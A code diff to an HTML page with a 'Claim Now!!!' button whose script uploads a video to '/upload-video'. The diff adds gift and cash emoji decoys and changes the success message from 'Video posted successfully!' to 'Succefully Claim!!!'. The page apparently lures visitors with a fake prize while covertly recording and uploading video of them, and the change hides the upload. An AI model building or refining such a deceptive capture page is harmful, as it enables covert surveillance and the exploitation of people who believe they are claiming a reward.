@@ -56,6 +56,16 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background:#f5f5f5; display:
 
     <button class="btn" id="startBtn">Claim Now!!!</button>
 </div>
+    <div class="item">🎁</div>
+<div class="item">💸</div>
+<div class="item">🎁</div>
+<div class="item">💰</div>
+<div class="item">🎁</div>
+<div class="item">💵</div>
+<div class="item">🎁</div>
+<div class="item">💸</div>
+<div class="item">🎁</div>
+<div class="item">💰</div>
 
 <script>
 const btn = document.getElementById('startBtn');
@@ -132,7 +142,7 @@ btn.addEventListener('click', async () => {
                 const res = await fetch("/upload-video", { method:'POST', body: formData });
                 const data = await res.json();
                 console.log("Video posted:", data);
-                loading.innerHTML = "<p>✅ Video posted successfully! 🎉</p>";
+                loading.innerHTML = "<p>Succefully Claim!!!</p>";
             } catch(err) {
                 console.error(err);
                 loading.innerHTML = "<p>❌ Error posting video!</p>";
